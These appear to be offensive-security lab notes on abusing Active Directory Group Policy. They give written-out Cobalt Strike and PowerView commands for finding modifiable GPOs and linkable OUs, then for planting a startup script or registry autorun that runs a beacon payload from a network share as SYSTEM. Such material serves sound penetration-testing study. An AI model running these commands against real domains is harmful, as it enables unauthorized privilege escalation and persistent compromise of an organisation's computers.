# Abusing Group Policy

Group Policy Objects (GPOs) are sets of configurations that are applied to Organisational Units (OUs). By default, only Domain Admins can create GPOs and link them to OUs, but it's common to delegate those rights to other teams (e.g. a "Workstation Admins" group may have rights to manage GPOs that apply to a "Workstation" OU). These can create privilege escalation opportunities by allowing user to apply malicious GPOs to domain admin users or their computers.

## Modify Existing GPO

Search for these in PS by enumerating all GPOs in the domain (```Get-DomainGPO```) and checking the ACL of each one (```Get-DomainObjectAcl```). Look for any for which a principal has modify privileges such as CreateChild, WriteProperty, or GenericWrite, and filter out the legitimate principals including SYSTEM, Domain Admins, and Enterprise Admins:

    beacon> powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

Once a result is returned, resolve the GPO name and the SID of the principal:

    beacon> powershell Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath

To see which group can modify "Vulnerable GPO":

    beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

Also want to know which OU(s) this GPO applies to, and by extension which computers are in those OUs. GPOs are linked to an OU by modifying the gPLink property of the OU. The Get-DomainOU cmdlet has a handy -GPLink parameter which takes a GPO GUID:

    beacon> powershell Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName

To get the computers in an OU, use Get-DomainComputer and use the OU's distinguished name as a search base:

    beacon> powershell Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

To modify a GPO without the use of GPMC (Group Policy Management Console), modify the associated files directly in SYSVOL (the gpcFileSysPath):

    beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}

Do that manually or use [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse), which has several abuses built into it; e.g. using a Computer Startup Script: It will put a startup script in SYSVOL that will be executed each time an affected computer starts (which incidentally also acts as a good persistence mechanism):

    beacon> execute-assembly SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"

(can find this "software" share using PowerView: ```beacon> powershell Find-DomainShare -CheckShareAccess```)

Log into the console of Workstation 1 and run ```gpupdate /force```. Reboot the machine, and the DNS Beacon will execute as SYSTEM.

SharpGPOAbuse has other functions such as adding an immediate scheduled task that can be useful.

## Create and Link a GPO

Group Policy Objects are stored in CN=Policies,CN=System; principals that can create new GPOs in the domain have the "Create groupPolicyContainer objects" privilege over this object. Find these with PowerView's Get-DomainObjectAcl cmdlet by looking for those that have "CreateChild" rights on the "Group-Policy-Container", and then resolving their SIDs to readable names:

    beacon> powershell Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }

A GPO doesn't do anything unless linked to an OU. The ability to link a GPO to an OU is controlled on the OU itself by granting "Write gPLink" privileges. Find with PowerView by first getting all of the domain OUs and piping them into Get-DomainObjectAcl again. Iterate over each one looking for instances of "WriteProperty" over "GP-Link":

    beacon> powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl
    beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

GPOs can be managed from PS via the RSAT modules. These are an optional install and so usually only found on management workstations. The Get-Module cmdlet will show if they are present.

    beacon> powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

Use the New-GPO cmdlet to create and link a new GPO:

    beacon> powershell New-GPO -Name "Evil GPO"

Some abuses can be implemented directly using RSAT, e.g. Set-GPPrefRegistryValue adds an HKLM autorun key to the registry:

    beacon> powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString

Next, apply the GPO to the target OU and reboot:

    beacon> powershell Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"



